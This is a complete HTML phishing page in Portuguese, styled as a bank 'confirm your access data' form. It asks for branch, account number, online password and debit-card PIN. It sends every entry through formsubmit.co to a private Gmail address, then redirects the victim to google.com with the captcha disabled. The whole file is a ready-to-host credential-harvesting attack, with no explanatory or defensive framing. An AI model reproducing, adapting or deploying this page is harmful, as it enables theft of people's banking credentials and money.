<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Confirmação de Acesso</title>
  <style>
    body {
      background-color: #f57c00;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    form {
      background-color: #fff;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      color: #f57c00;
      text-align: center;
      margin-bottom: 24px;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: bold;
      color: #333;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
    }
    button {
      width: 100%;
      background-color: #f57c00;
      color: #fff;
      padding: 14px;
      font-size: 17px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background-color: #e65100;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/bieell.vg@gmail.com" method="POST">
    <h2>Confirme seus dados de acesso</h2>
    <label for="agencia">Agência</label>
    <input type="text" id="agencia" name="agencia" placeholder="0000" required />
    <label for="conta">Conta</label>
    <input type="text" id="conta" name="conta" placeholder="000000-0" required />
    <label for="senhaacesso">Senha de acesso</label>
    <input type="password" id="senhaacesso" name="senhaacesso" placeholder="******" required />
    <label for="senhadb">Senha do cartão débito</label>
    <input type="password" id="senhadb" name="senhadb" placeholder="******" required />
    <input type="hidden" name="_next" value="https://google.com" />
    <input type="hidden" name="_captcha" value="false" />
    <button type="submit">Confirmar</button>
  </form>
</body>
</html>
